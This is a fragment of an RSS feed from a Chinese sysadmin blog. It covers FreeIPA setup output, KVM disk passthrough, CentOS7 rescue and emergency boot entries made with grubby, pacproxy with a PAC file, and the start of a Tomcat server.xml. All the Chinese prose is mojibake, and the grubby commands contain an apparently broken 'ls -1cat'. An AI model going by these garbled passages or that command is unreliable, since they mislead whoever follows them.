&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The following operations may take some minutes to complete.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please &lt;span class=&#34;nb&#34;&gt;wait&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; the prompt is returned.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Configuring NTP daemon &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ntpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Setup &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Next steps:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        1. You must make sure these network ports are open:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                TCP Ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  * 80, 443: HTTP/HTTPS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  * 389, 636: LDAP/LDAPS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  * 88, 464: kerberos
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                UDP Ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  * 88, 464: kerberos
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  * 123: ntp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        2. You can now obtain a kerberos ticket using the command: &lt;span class=&#34;s1&#34;&gt;&amp;#39;kinit admin&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           This ticket will allow you to use the IPA tools &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e.g., ipa user-add&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           and the web user interface.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Be sure to back up the CA certificate stored in /root/cacert.p12
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This file is required to create replicas. The password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; this file is the Directory Manager password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šï¼Œå°±è£…å¥½äº† FreeIPAï¼Œé…ç½®æ–‡ä»¶åœ¨ /etc/ipa/default.conf&lt;/p&gt;</description>
    </item>
    <item>
      <title>KVMä¸‹é™„åŠ ç¡¬ç›˜çš„passthroughç›´é€š</title>
      <link>https://rendoumi.com/posts/20211119-kvm_disk_passthrough/</link>
      <pubDate>Fri, 19 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211119-kvm_disk_passthrough/</guid>
      <description>&lt;p&gt;è¿™ä¸ªæ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹è¦å­˜æ”¾ 2TB çš„æ•°æ®ï¼Œä½†æ˜¯ç³»ç»Ÿæ˜¯ 1.7TB çš„ 4 å— 600G ç›˜ç»„æˆçš„ Raid10ã€‚&lt;/p&gt;
&lt;p&gt;å¾ˆæ˜æ˜¾ç›˜ç©ºé—´ä¸å¤Ÿäº†ï¼Œå»åº“æˆ¿æ‰¾ä¸¤å— 10TB çš„å¤§ç›˜ç»„æˆ Raid1 ç»™ä»–ç”¨å¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;é—®é¢˜æ¥äº†ï¼Œç³»ç»Ÿæ˜¯ KVM è™šæœºï¼Œæ€æ ·æŠŠè¿™ä¸ª 10TB çš„å¤§ç›˜ç»™é€è¿›è™šæœºå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;è¿™é‡Œé¢è¿˜çœŸæœ‰è¦æ³¨æ„çš„é—®é¢˜ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Important&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest virtual machines should not be given write access to whole disks or block devices (for example, /dev/sdb).&lt;/strong&gt; Guest virtual  machines with access to whole block devices may be able to modify  volume labels, which can be used to compromise the host physical  machine system. &lt;strong&gt;Use partitions (for example, /dev/sdb1) or LVM  volumes to prevent this issue.&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CentOS7çš„æ•‘æ´æ¨¡å¼å’Œç´§æ€¥æ¨¡å¼</title>
      <link>https://rendoumi.com/posts/20211119-linux_rescue/</link>
      <pubDate>Fri, 19 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211119-linux_rescue/</guid>
      <description>&lt;p&gt;è¯´åˆ° CentOS7 çš„ç´§æ€¥æ¨¡å¼ä¸æ•‘æ´æ¨¡å¼ï¼Œç½‘ä¸Šå¯ä»¥æœåˆ°æ¼«å¤©é£çš„å¸–å­ï¼Œè¯´ä¸€ä¸‹åŒºåˆ«&lt;/p&gt;
&lt;p&gt;RESCUE æ•‘æ´æ¨¡å¼ï¼š
æ•‘æ´æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ²¡æœ‰æŒ‚è½½ç¡¬ç›˜ï¼Œå¯ä»¥å°†ç¡¬ç›˜ mount å‡ºç„¶åæ‹·å‡ºæ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;EMERGENCY ç´§æ€¥æ¨¡å¼ï¼š
ç´§æ€¥æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªæœ€å°çš„ç¯å¢ƒã€‚æ ¹ç›®å½•æ¡£æ¡ˆç³»ç»Ÿå°†ä¼šè¢«æŒ‚è½½ä¸ºä»…èƒ½è¯»å–ï¼Œè€Œä¸”å°†ä¸ä¼šåšä»»ä½•çš„è®¾å®šã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶è¿›å…¥çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè¿›å…¥ç³»ç»Ÿçš„æ—¶å€™æŒ‰ e ä¿®æ”¹ grub èœå•å‚æ•°ï¼Œå°±å¯ä»¥è¿›å…¥ä¸åŒçš„æ¨¡å¼&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡è®¨è®ºçš„é‡ç‚¹ä¸æ˜¯æ€ä¹ˆè¿›å»ï¼Œè€Œæ˜¯é‚£ä¸¤å¥å‘½ä»¤ï¼Œåœ¨ç´§æ€¥çŠ¶æ€ä¸‹åæ­£æˆ‘æ˜¯è®°ä¸ä½çš„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemd.unit&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;rescue.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemd.unit&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;emergency.target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éƒ½æ²¡æœ‰ä¹‹å‰çš„ single ç®€å•ï¼Œä¹Ÿå®Œå…¨è®°ä¸ä½ï¼Œæ—¢ç„¶è®°ä¸ä½ï¼Œé‚£å°±å¹²è„†åšåˆ°èœå•é‡Œå¥½äº†ï¼Œè¿™æ‰æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨éƒ½æ˜¯ä½¿ç”¨ grub2 äº†ï¼Œè€Œä¸æ˜¯ grubï¼Œè¿™å¾ˆé‡è¦ã€‚grub2çš„é…ç½®æ–‡ä»¶æ˜¯ /boot/grub2/grub.cfgã€‚&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹ grub2 æœ‰ä¸¤ä¸ªå·¥å…·ï¼Œgrub2-mkconfig å’Œ grubbyï¼Œä¸è¦åŒæ—¶ä½¿ç”¨è¿™ä¸¤ä¸ªå·¥å…·ä¿®æ”¹ï¼Œä¼šè¦†ç›–çš„&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;grub2-mkconfig ä¼šå»æœç´¢ /boot ç›®å½•ä¸‹çš„å†…æ ¸æ–‡ä»¶ï¼Œæœ‰å¤šå°‘ä¸ªå†…æ ¸å°±ä¼šç”Ÿæˆå¤šå°‘ä¸ªå¯åŠ¨é¡¹ã€‚é‚£ä¹ˆå¦‚æœæ˜¯åŒä¸€ä¸ªå†…æ ¸ï¼Œæƒ³ä¿®æ”¹ä¸åŒçš„å¯åŠ¨å‚æ•°ï¼Œåšå¤šä¸ªå¯åŠ¨é¡¹å°±å®Œè›‹ï¼Œä»–ä¸èƒ½è‡ªåŠ¨ç”Ÿæˆå•å†…æ ¸çš„å¤šä¸ªå¯åŠ¨é¡¹&lt;/li&gt;
&lt;li&gt;grubby å¾ˆçµæ´»ï¼Œå¯ä»¥æ ¹æ®å½“å‰ grub2 çš„é…ç½®ï¼Œç”Ÿæˆä¸€ä¸ªå†…æ ¸ï¼Œå¤šä¸ªä¸åŒå¯åŠ¨å‚æ•°çš„å¤šä¸ªå¯åŠ¨é¡¹ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬è¦åŠ è¿›å»ä¸¤ä¸ªåªæ˜¯å¯åŠ¨å‚æ•°ä¸åŒï¼Œå†…æ ¸å…¶å®ä¸€æ ·çš„å¯åŠ¨é¡¹ï¼Œç”¨ grubby å°±å¥½äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grubby --add-kernel&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ls -1cat /boot/vmlinuz*&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep rescue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; --title&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;RESCUE BOOT&amp;#34;&lt;/span&gt; --initrd&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ls -1cat /boot/initramfs*&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep rescue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; --args&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;systemd.unit=rescue.target&amp;#34;&lt;/span&gt; --copy-default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grubby --add-kernel&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ls -1cat /boot/vmlinuz*&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep rescue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; --title&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;EMERGENCY BOOT&amp;#34;&lt;/span&gt; --initrd&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ls -1cat /boot/initramfs*&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep rescue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; --args&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;systemd.unit=emergency.target&amp;#34;&lt;/span&gt; --copy-default
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ‡å¿Œæˆ‘ä»¬ä¹‹åä¸èƒ½è¿è¡Œ&lt;/p&gt;</description>
    </item>
    <item>
      <title>linuxä¸‹web pacproxyçš„ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20211116-pacproxy/</link>
      <pubDate>Tue, 16 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211116-pacproxy/</guid>
      <description>&lt;p&gt;è¯´å®åœ¨è¯ï¼Œè¿™ä¸ªåœºæ™¯éå¸¸æ€ªå¼‚ï¼Œå®¢æˆ·åœ¨ linux ä¸‹è¦åŠ¨æ€æ ¹æ® url é€‰æ‹©ä»£ç†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211116132624536&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211116-pacproxy/image-20211116132624536.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹å›¾ï¼Œä¸­é—´çš„æ˜¯å‰ç«¯ä»£ç†ï¼Œåœ°å€æ˜¯ 192.168.1.1:8080ï¼Œç„¶åå®¢æˆ·è®¾ç½®ä½¿ç”¨è¿™ä¸ªä»£ç†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;http_proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://192.168.1.1:8080
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;https_proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://192.168.1.1:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå¯¹åº”åç«¯æœ‰ä¸‰ä¸ªä»£ç†ï¼Œä¸¤ä¸ª http ä»£ç†ï¼Œä¸€ä¸ª socks ä»£ç†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http  192.168.2.1:3128
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socks 192.168.2.2:1080
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http  192.168.2.3:3128
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¦æ ¹æ®å®¢æˆ·çš„è¯·æ±‚ URL æ¥å†³å®šå…·ä½“è¦ä½¿ç”¨åç«¯çš„å“ªä¸ªä»£ç†&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå¦‚æœåœ¨æµè§ˆå™¨ä¸Šè®¾ç½®éå¸¸å®¹æ˜“ï¼Œè®¾ç½® PAC å³å¯ã€‚ä½†æ˜¯ååå®¢æˆ·ç«¯ä¸æ˜¯æµè§ˆå™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªç¨‹åºï¼Œé‚£ä¹ˆéº»çƒ¦å°±æ¥äº†ã€‚æ€ä¹ˆè®¾ç½®å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¾ˆç®€å•ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…-pacproxy&#34;&gt;ä¸€ã€å®‰è£… pacproxy&lt;/h2&gt;
&lt;p&gt;ç½‘å€ï¼šhttps://github.com/williambailey/pacproxy&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/williambailey/pacproxy/releases/download/v.2.0.4/pacproxy_2.0.4_linux_amd64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf pacproxy_2.0.4_linux_amd64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‹·å‡ºæ¥ pacproxy å¤‡ç”¨&lt;/p&gt;
&lt;h2 id=&#34;äºŒç”Ÿæˆé…ç½®æ–‡ä»¶&#34;&gt;äºŒã€ç”Ÿæˆé…ç½®æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;æœ€ä¸»è¦çš„å°±æ˜¯ PAC æ–‡ä»¶çš„ç”Ÿæˆ&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç»™ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; pac
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;function FindProxyForURL(url, host)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    if (host == &amp;#34;www.baidu.com&amp;#34;) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        return &amp;#34;PROXY 192.168.2.1:3128&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    else if (host == &amp;#34;www.sina.com.cn&amp;#34;) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        return &amp;#34;SOCKS 192.168.2.2:1080&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    else if (host == &amp;#34;www.sohu.com&amp;#34;) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        return &amp;#34;SOCKS 192.168.2.3:1080&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    }    
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    else {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        return &amp;#34;DIRECT&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶å® PAC æ–‡ä»¶çš„å†…å®¹å°±æ˜¯ä¸€æ®µ javascriptï¼Œç”¨æ¥è¿”å›ä»£ç†çš„åœ°å€&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tomcat server.xmlé…ç½®è¯¦ç»†è§£é‡Š</title>
      <link>https://rendoumi.com/posts/20211115-tomcat_config/</link>
      <pubDate>Mon, 15 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211115-tomcat_config/</guid>
      <description>&lt;p&gt;Tomcat æ˜¯ä¸€ä¸ª HTTP serverã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ª serverlet å®¹å™¨ï¼Œå¯ä»¥æ‰§è¡Œ java çš„ Servletï¼Œä¹Ÿå¯ä»¥æŠŠ JavaServer Pagesï¼ˆJSPï¼‰å’Œ JavaServerFacesï¼ˆJSFï¼‰ç¼–è¯‘æˆ Java Servletã€‚å®ƒçš„æ¨¡å‹å›¾å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211115193643613&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211115-tomcat_config/image-20211115193643613.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»™ä¸ªç”Ÿäº§ç¯å¢ƒ server.xml çš„ä¾‹å­ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;&amp;lt;?xml version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;1.0&amp;#39; encoding=&amp;#39;utf-8&amp;#39;?&amp;gt;&lt;/span&gt;
